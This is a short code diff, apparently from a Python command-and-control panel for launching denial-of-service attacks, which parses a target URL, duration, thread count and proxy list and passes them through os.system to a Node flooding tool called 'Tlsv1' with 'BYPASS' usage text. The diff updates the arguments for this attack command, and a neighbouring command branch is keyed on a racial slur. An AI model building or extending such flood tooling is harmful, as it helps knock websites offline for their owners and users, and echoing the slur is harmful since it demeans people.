@@ -623,14 +623,15 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                rps = cnc.split()[3]
-                threads = cnc.split()[4]
-                proxy = cnc.split()[5]
-                
-                os.system(f'node Tlsv1 {url} {time} {time}')
+                threads = cnc.split()[3]
+                proxy = cnc.split()[4]
+                debug = cnc.split()[5]
+                ua = cnc.split()[6]
+                querystring = cnc.split()[7]
+                os.system(f'node Tlsv1 {url} {time} {time} {threads} {proxy} {debug} {ua} {querystring}')
             except IndexError:
-                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
-                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+                print('Usage: BYPASS <url> <time> <threads> <proxies.txt/http.txt> <false> <all> <true>')
+                print('Example: BYPASS https://example.com/ 60 500 htp.txt false all true')
 
         elif "Nigga" in cnc:
             try:
